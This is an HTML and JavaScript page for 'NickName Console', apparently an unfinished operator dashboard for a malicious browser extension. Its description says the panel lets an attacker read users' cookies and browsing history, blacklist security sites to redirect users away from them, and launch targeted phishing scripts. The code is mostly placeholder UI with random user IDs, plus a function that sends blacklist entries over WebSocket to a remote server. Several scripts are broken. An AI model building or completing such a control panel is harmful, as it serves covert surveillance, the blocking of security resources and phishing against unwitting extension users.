<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SpeedDemon</title>
    <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
	<script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
  	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  </head>

  

  <body data-spy = "scroll" data-target=".navbar">

	<nav class="navbar navbar-expand-sm bg-dark navbar-dark fixed-top">
		<a class="navbar-brand" href="#">NickName123</a>
		<ul class = "navbar-nav">
			<li class="nav-item">
				<a class="nav-link" href="#userSection">Users</a>
			</li>
			<li class = "nav-item">
				<a class="nav-link" href="#blackListSection">Blacklist</a>
			</li>
		</ul>
	</nav>

	<div class = "jumbotron">
		<h1 class = "display-4">NickName Console</h1>
		<p class = "lead">
			This website is the hacker's gateway to the NickName extension. This interface will allow you to access user cookies and history, create a black list of security sites to redirect users from, and launch targeted phishing and other such scripts at users. Happy hacking!
		</p>
		<hr class="my-4">
		<p>Note: We are not responsible for any privacy breaches, as all permissions have been given by users of our application to access their data.</p>
	</div>  

	<div id = "userSection">
	
		<div class="container-fluid">
			<h3>All Users</h3>
			<p><strong>Note:</strong> The <strong>data-parent</strong> attribute makes sure that all collapsible elements under the specified parent will be closed when one of the collapsible item is shown.</p>
			<div id="accordion">
				<div id="invisCard" class="card">
					<div id="invisCardHeader" class="card-header">
						<a id="invisCardLink" class="card-link" data-toggle="collapse" href="#invisCardCollapse">
						</a>
					</div>
					<div id="invisCardCollapse" class="collapse" data-parent="#accordion">
						<div id="invisCardBody" class="card-body">
						</div>
					</div>
				</div>
				<!-- <div class="card">
				<div class="card-header">
					<a class="collapsed card-link" data-toggle="collapse" href="#collapseTwo">
					Collapsible Group Item #2
				</a>
				</div>
				<div id="collapseTwo" class="collapse" data-parent="#accordion">
					<div class="card-body">
					Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
					</div>
				</div>
				</div>
				<div class="card">
				<div class="card-header">
					<a class="collapsed card-link" data-toggle="collapse" href="#collapseThree">
					Collapsible Group Item #3
					</a>
				</div>
				<div id="collapseThree" class="collapse" data-parent="#accordion">
					<div class="card-body">
					Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
					</div>
				</div> 
				</div> -->

				<!-- Add Accordion Cards -->
				<script>
					window.userCount = 0;   // Declare a global variable
			        //This global var is used to give each new user card added a different id

			        //hide the accordion element that is being cloned
			        /*document.getElementById("invisCard").style.display = "none";
			        document.getElementById("invisCardHeader").style.display = "none";
			        document.getElementById("invisCardLink").style.display = "none";
			        document.getElementById("invisCardCollapse").style.display = "none";*/
			       //document.getElementById("invisCardBody").style.display = "none";

   					function makeCard(id) {
   						userCount++;
	        			//Change count each time a new user is added
	        	
			        	/*<td><a id=0 class="user-link" href="infoPageShawn.html" onclick="idClick(this.id)" ></a></td>
			        	<div class="card-header">
							<a class="card-link" data-toggle="collapse" href="#collapseOne">
							Collapsible Group Item #1
							</a>
						</div>
						<div id="collapseOne" class="collapse" data-parent="#accordion">
							<div class="card-body">
							User info user info user info soiadjf ;osa;do invoiandvodsanondv;asd;vjajsdviajds;oijaodsjvojsadovjoisdjv;oajovdhj;oiahcsovhz;ohxchvozxhcohv;osadvhohdsa;ovhdsv
							</div>
						</div>*/

						//Create a card. 
						/*var card = document.createElement("card");
						var header = document.createElement("card-header");
						var userId = document.createTextNode(id);
						header.appendChild(userId);
						//Make it collapsible
						var collapser = document.createElement("collapse");
						collapser.data = "#accordion";
						//Make body
						var cardBody = document.createElement("card-body");
						//gets filled by other functions
						collapser.appendChild(cardBody);
						header.appendChild(collapser);
						//add to the accordion
						var addTo = document.getElementById("accordion");
						addTo.appendChild(header);*/

						/*var cardInvis = document.getElementById("invisCard");
						var card = cardInvis.cloneNode(false);
						var cardHeaderInvis = document.getElementById("invisCardHeader");
						var cardHeader = cardHeaderInvis.cloneNode(false);
						var cardLinkInvis = document.getElementById("invisCardLink");
						var cardLink = cardInvis.cloneNode(false);
						var cardCollapseInvis = document.getElementById("invisCardCollapse");
						var cardCollapse = cardHeaderInvis.cloneNode(false);
						var cardBodyInvis = document.getElementById("invisCardBody");
						var cardBody = cardInvis.cloneNode(false);

						card.id = userCount;
						var userId = document.createTextNode(id);
						cardLink.innerHTML = userId;
						//innerHTML of cardBody must be filled by the other functions

						//connect
						card.appendChild(cardHeader);
						cardHeader.appendChild(cardLink);
						card.appendChild(cardCollapse);
						cardCollapse.appendChild(cardBody);

						var addTo = document.getElementById("accordion");
						addTo.appendChild(card);*/

						var cardInvis = document.getElementById("invisCard");
						var card = cardInvis.cloneNode(true);
						card.id = userCount;

						var header = card.children[0];
						var link = header.children[0];
						link.innerHTML = id;
						link.id = "link" + userCount;
						var userCountString = userCount.toString();
						//link.href = hrefString;
						link.href = "#id" + userCountString;
						//link.href = "#1";

						var collapse = card.children[1];
						//collapse.id = userCountString;
						collapse.id = "id" + userCountString;

	

						var addTo = document.getElementById("accordion");
						addTo.appendChild(card);

   					}
   				</script>


				<script>
					var rand1 = Math.floor((Math.random() * 10000) + 1);
					rand1 = rand1.toString();
					var rand2 = Math.floor((Math.random() * 10000) + 1);
					rand2 = rand2.toString();
					var rand3 = Math.floor((Math.random() * 10000) + 1);
					rand3 = rand3.toString();

					var idArray = [rand1, rand2, rand3];

					for (var i = 0; i < idArray.length; i++) {
						makeCard(idArray[i]);
					}
				</script>
		
				

   				

				<!-- History Stuff -->
				<script>
					var rand1 = Math.floor((Math.random() * 10000) + 1);
					rand1 = rand1.toString();
					var rand2 = Math.floor((Math.random() * 10000) + 1);
					rand2 = rand2.toString();
					var rand3 = Math.floor((Math.random() * 10000) + 1);
					rand3 = rand3.toString();

					var historyArray = [rand1, rand2, rand3];

				</script>
				<button type="button" class="btn btn-outline-secondary btn-lg" onclick="fillHistory('collapseOne', historyArray)">Test fillHistory</button>

				<script>
					function fillHistory(index, historyArray){

						var table = document.createElement("table");
						/*var header = table.createTHead();
						var row = header.insertRow(0);
						var cell = row.insertCell(0);
						cell.innerHTML = "<b>History</b>";*/

						for (var i = 0; i < historyArray.length; i++) {
							var aRow = document.createElement('tr');
							var idCol = document.createTextNode(historyArray[i]);
							table.appendChild(aRow);
							aRow.appendChild(idCol);
						}

						var addTo = document.getElementById(index);
						addTo.appendChild(table);

					}
				</script>


			</div>
		</div>


	</div>	

	<br><br>

	<div class = "ml-3">


	<div id = "blackListSection">
	<h4>Add Site to Blacklist Here</h4>
	<input type="text" class="form-control blacklist" placeholder="URL">
	<button class="btn btn-primary" type="button" onclick="blackList()">Add Site</button>

	<br><br><br>

	<h4>Blacklisted Sites</h4>
	<ul class = "list-group">
		<li class="list-group-item">securitee.org</li>
	</ul>

	<script>
	    function blackList(){
	        var URL = document.getElementById(text);
	        var HOST = 'wss://projectnickname123.herokuapp.com';
	        var ws = new WebSocket(HOST);
	        var jsonPackage = {id: 0, type:'list', addString: URL};
	        ws.send(JSON.stringify(jsonPackage));
	    }
		window.addEventListener("hashchange", function() { scrollBy(0, -70) });
	</script>

	<script>
		function idClick(count){		
			localStorage.setItem("id", document.getElementById(count).innerHTML);
		}
	</script>

	<script>
		var jsonPackage = {type: statusRequest};
		ws.send(JSON.stringify(jsonPackage));
		ws.onmessage = function(e){
			if(e.type == "status"){
				object = JSON.parse(e.data);
				var ids = object.ids;
				var statusArray = object.statuses;
				var table = document.getElementById(statusTable);
				for(i = 0; i < ids.length; i++){
					var aRow = document.createElement('tr');
					var idCol = document.createTextNode(ids[i]);
					var statusCol = document.createTextNode(statusArray[i]);
					idCol.setAttribute('href', "infoPage.html");
					table.appendChild(aRow);
					aRow.appendChild(idCol);
					aRow.appendChild(statusCol);
				}
			}	
		}
	</script>
	
	</div>
	</div>
	</div>
  </body>

</html>
